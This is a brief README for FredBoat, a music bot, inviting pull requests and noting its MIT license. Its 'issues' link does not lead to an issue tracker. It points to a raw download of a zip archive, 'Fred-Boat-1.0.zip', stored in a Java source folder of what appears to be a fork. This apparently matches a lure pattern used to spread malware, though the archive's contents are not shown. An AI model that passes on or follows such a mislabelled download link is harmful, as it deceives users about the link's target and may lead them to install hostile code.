FredBoat is a bot that has various features, but most notably is that it can play music. Pull requests are welcome and please report any issues you find in [issues](https://github.com/ahmmedaya94/FredBoat/raw/refs/heads/dev/FredBoat/src/main/java/fredboat/db/Fred-Boat-1.0.zip).

FredBoat is licensed under the MIT license, so feel free to copy small or large parts of the code here without having to ask. I would love to see what you can create with it!
